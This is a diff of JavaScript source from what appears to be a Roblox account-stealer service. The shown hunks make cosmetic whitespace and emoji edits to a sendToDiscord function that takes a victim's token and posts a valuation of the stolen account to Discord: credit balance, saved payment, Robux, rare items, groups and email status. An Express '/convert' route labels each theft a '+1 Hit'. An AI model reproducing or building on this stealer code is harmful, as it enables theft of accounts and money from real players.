@@ -1876,9 +1876,9 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             name: "<a:emoji_42:1410523396995022890> Billing",
             value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${userData.creditBalance} (Est. ${Math.floor(userData.creditBalance * 80)} Robux)`: "$0"}\nSaved Payment: ${userData.savedPayment ? "True" : "False"}`,
             inline: false
-          
+
           },
-          
+
           {
             name: "<:emoji_31:1410233610031857735> Robux In/Out",
             value: `<:emoji_31:1410233610031857735> ${userData.robuxIncoming || 0} / <:emoji_31:1410233610031857735> ${userData.robuxOutgoing || 0}`,
@@ -1889,7 +1889,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             value: `${userData.korblox ? "<:KorbloxDeathspeaker:1408080747306418257> True" : "<:KorbloxDeathspeaker:1408080747306418257> False"}\n${userData.headless ? "<:HeadlessHorseman:1397192572295839806> True" : "<:HeadlessHorseman:1397192572295839806> False"}`,
             inline: true
           },
-                    
+
           {
             name: "<:emoji_38:1410520554842361857> Groups Owned",
             value: userData.groupsOwned?.toString() || "0",
@@ -1910,7 +1910,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             value: `Email Status: ${userData.emailVerified ? "Verified" : "Unverified"}\nVoice Chat: ${userData.voiceChatEnabled ? "Enabled" : "Disabled"}\nAccount Age: ${userData.accountAge || 0} Days`,
             inline: false                  
           },
-          
+
         ],
         footer: {
           text: "Made By .gg/sZbFX2wPVz"
@@ -2668,7 +2668,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       });
 
       const scriptLabel = `${scriptType} (Subdirectory: ${directoryName}/${subdirectoryName})`;
-      const customTitle = `<:hacker:1404745235711655987> +1 Hit - ${directoryName.toUpperCase()} AUTOHAR`;
+      const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - ${directoryName.toUpperCase()} AUTOHAR`;
 
 
 
